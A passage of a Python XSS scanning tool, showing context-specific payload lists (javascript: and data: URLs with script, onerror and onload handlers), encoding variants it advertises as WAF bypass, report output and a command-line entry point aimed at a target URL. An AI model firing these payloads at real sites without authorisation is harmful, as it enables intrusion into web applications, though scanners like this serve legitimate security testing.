                'url("onmouseover=alert(\'XSS\')")',
                'url("onfocus=alert(\'XSS\')")',
                'url("onblur=alert(\'XSS\')")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")',
                'data:text/html,<img src=x onerror=alert("XSS")>',
                'data:text/html,<svg onload=alert("XSS")>',
                'data:text/html,<iframe src="javascript:alert(\'XSS\')">',
                'data:text/html,<object data="javascript:alert(\'XSS\')">',
                'data:text/html,<embed src="javascript:alert(\'XSS\')">',
                'data:text/html,<form><button formaction="javascript:alert(\'XSS\')">',
                'data:text/html,<details open ontoggle="alert(\'XSS\')">'
            ]
        }
        
        # Get base payloads for the context
        base_payloads = payloads.get(context, payloads['html'])
        
        # Smart encoding based on context
        encoded_payloads = []
        for payload in base_payloads:
            # Always add the original payload
            encoded_payloads.append(payload)
            
            # Context-specific encoding
            if context == 'html':
                # For HTML context, add URL encoding and HTML entity encoding
                encoded_payloads.append(urllib.parse.quote(payload))
                encoded_payloads.append(urllib.parse.quote_plus(payload))
                # HTML entity encoding (hex)
                hex_encoded = "".join([f"&#x{ord(c):02x};" for c in payload])
                encoded_payloads.append(hex_encoded)
                # HTML entity encoding (decimal)
                dec_encoded = "".join([f"&#{ord(c)};" for c in payload])
                encoded_payloads.append(dec_encoded)
                
            elif context == 'attribute':
                # For attribute context, add URL encoding and HTML entity encoding
                encoded_payloads.append(urllib.parse.quote(payload))
                # HTML entity encoding (hex)
                hex_encoded = "".join([f"&#x{ord(c):02x};" for c in payload])
                encoded_payloads.append(hex_encoded)
                # HTML entity encoding (decimal)
                dec_encoded = "".join([f"&#{ord(c)};" for c in payload])
                encoded_payloads.append(dec_encoded)
                
            elif context == 'javascript':
                # For JavaScript context, add Unicode escape and URL encoding
                unicode_encoded = "".join([f"\\u{ord(c):04x}" for c in payload])
                encoded_payloads.append(unicode_encoded)
                encoded_payloads.append(urllib.parse.quote(payload))
                
            elif context == 'css':
                # For CSS context, add URL encoding
                encoded_payloads.append(urllib.parse.quote(payload))
                
            elif context == 'url':
                # For URL context, add double URL encoding
                encoded_payloads.append(urllib.parse.quote(payload))
                double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
                encoded_payloads.append(double_encoded)
        
        return list(set(encoded_payloads))

    def generate_xss_report(self):
        """Generate comprehensive XSS vulnerability report"""
        logger.info(f"{Colors.BLUE}[REPORT] Generating XSS vulnerability report...{Colors.END}")
        
        if not self.vulnerabilities:
            logger.info(f"{Colors.YELLOW}[REPORT] No XSS vulnerabilities found{Colors.END}")
            return
        
        print(f"\n{Colors.BOLD}{'='*60}")
        print(f"🚨 XSS VULNERABILITY REPORT 🚨")
        print(f"{'='*60}{Colors.END}")
        print(f"{Colors.GREEN}Found {len(self.vulnerabilities)} confirmed XSS vulnerabilities:{Colors.END}\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"{Colors.CYAN}[{i}] XSS Vulnerability:{Colors.END}")
            print(f"    URL: {vuln.url}")
            print(f"    Parameter: {vuln.parameter}")
            print(f"    Context: {vuln.context}")
            print(f"    Payload: {vuln.payload}")
            print(f"    Test URL: {vuln.test_url}")
            print(f"    Alert Text: {vuln.alert_text}")
            print(f"    Screenshot: {vuln.screenshot_path}")
            print()
        
        # Save to JSON file
        report_data = {
            'scan_time': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
        }
        
        try:
            with open('xss_vulnerabilities_report.json', 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"{Colors.GREEN}[REPORT] Detailed report saved to: xss_vulnerabilities_report.json{Colors.END}")
        except Exception as e:
            logger.error(f"{Colors.RED}[REPORT] Failed to save report: {e}{Colors.END}")

    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info(f"{Colors.YELLOW}[CLEANUP] Chrome WebDriver closed{Colors.END}")
            except Exception as e:
                logger.error(f"{Colors.RED}[CLEANUP] Error closing WebDriver: {e}{Colors.END}")

def print_banner():
    """Print scanner banner"""
    banner = f"""
{Colors.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                    ADVANCED XSS SCANNER                     ║
║              Real Chrome Browser Testing Mode               ║
║                                                              ║
║  🔍 Phase 1: Deep Reconnaissance & Parameter Discovery      ║
║  🧪 Phase 2: Chrome-Based XSS Testing & PoC Generation     ║
║  📸 Phase 3: Alert Detection & Screenshot Capture          ║
║                                                              ║
║  Features:                                                   ║
║  • Context-aware payload injection                          ║
║  • Unique alert ID for accurate detection                   ║
║  • Real Chrome browser testing                              ║
║  • Automatic screenshot PoC generation                      ║
║  • Advanced WAF bypass techniques                           ║
║  • Parallel processing for speed                            ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
    """
    print(banner)

def main():
    """Main scanner function"""
    import sys
    import hashlib
    
    print_banner()
    
    if len(sys.argv) != 2:
        print(f"{Colors.RED}Usage: python {sys.argv[0]} <target_url>{Colors.END}")
        print(f"{Colors.YELLOW}Example: python {sys.argv[0]} http://testphp.vulnweb.com{Colors.END}")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    print(f"{Colors.BLUE}🎯 Target: {target_url}{Colors.END}")
    print(f"{Colors.BLUE}🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n")
    
    try:
        # Phase 1: Deep Reconnaissance
        print(f"{Colors.PURPLE}{'='*60}")
        print(f"🔍 PHASE 1: DEEP RECONNAISSANCE")
        print(f"{'='*60}{Colors.END}")
        
        recon = AdvancedReconnaissance(target_url, max_depth=3, max_threads=20)
        recon_data = recon.run_reconnaissance()
        
        # Phase 2: XSS Scanning
        print(f"\n{Colors.PURPLE}{'='*60}")
        print(f"🧪 PHASE 2: CHROME-BASED XSS TESTING")
        print(f"{'='*60}{Colors.END}")
        
        scanner = AdvancedXSSScanner(recon_data)
        vulnerabilities = scanner.scan_xss_vulnerabilities()
        
        # Phase 3: Report Generation
        print(f"\n{Colors.PURPLE}{'='*60}")
        print(f"📊 PHASE 3: VULNERABILITY REPORT")
        print(f"{'='*60}{Colors.END}")
        
        scanner.generate_xss_report()
        
        # Cleanup
        scanner.cleanup()
        
        print(f"\n{Colors.GREEN}✅ Scan completed successfully!{Colors.END}")
        print(f"{Colors.BLUE}📸 Screenshots saved in: ./screenshots/{Colors.END}")
        print(f"{Colors.BLUE}📋 Full report saved as: xss_vulnerabilities_report.json{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️  Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Scan failed: {e}{Colors.END}")
        logger.error(f"Main scan error: {e}")
    
    print(f"\n{Colors.CYAN}🔒 Advanced XSS Scanner - Completed{Colors.END}")

if __name__ == "__main__":
    main()